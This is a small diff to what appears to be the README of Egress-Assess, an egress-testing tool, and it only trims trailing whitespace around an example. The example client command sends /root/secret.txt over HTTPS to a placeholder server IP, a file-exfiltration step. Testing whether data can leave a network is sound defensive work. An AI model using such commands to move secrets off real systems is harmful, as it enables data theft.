@@ -33,4 +33,5 @@ Example 3
 ./Egress-Assess.py --server https
 
 - Client
-./Egress-Assess.py --client https --file /root/secret.txt --ip <server>  
+./Egress-Assess.py --client https --file /root/secret.txt --ip <server>
+  
